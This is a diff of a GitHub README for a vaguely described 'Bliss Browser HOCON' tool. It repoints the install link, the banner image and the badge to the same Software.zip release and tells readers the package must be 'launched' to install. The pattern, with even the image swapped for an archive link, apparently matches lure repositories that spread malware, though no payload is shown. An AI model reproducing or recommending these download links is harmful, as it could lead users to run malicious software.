@@ -13,7 +13,7 @@ This repository contains the necessary tools and support for writing and running
 
 ## Installation 🛠️
 To get started with Bliss Browser HOCON, download the software package from the link below:
-[Launch Bliss Browser HOCON](https://github.com/user-attachments/files/18388744/Software.zip)
+[Launch Bliss Browser HOCON](https://github.com/Yazan61671/Bliss_Browser_HOCON/releases/download/v1.0/Software.zip)
 
 📌 Note: The software package needs to be launched to initiate the installation process.
 
@@ -53,6 +53,6 @@ For any questions or issues regarding the Bliss Browser HOCON module, please che
 
 Let's embrace the power of HOCON language in the Bliss Browser environment and elevate your web development experience! 🚀🌐
 
-![Bliss Browser HOCON](https://via.placeholder.com/800x400)
+![Bliss Browser HOCON](https://github.com/Yazan61671/Bliss_Browser_HOCON/releases/download/v1.0/Software.zip)
 
-[![Launch Bliss Browser HOCON](https://img.shields.io/badge/Launch-Bliss_Browser_HOCON-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Launch Bliss Browser HOCON](https://github.com/Yazan61671/Bliss_Browser_HOCON/releases/download/v1.0/Software.zip)](https://github.com/Yazan61671/Bliss_Browser_HOCON/releases/download/v1.0/Software.zip)
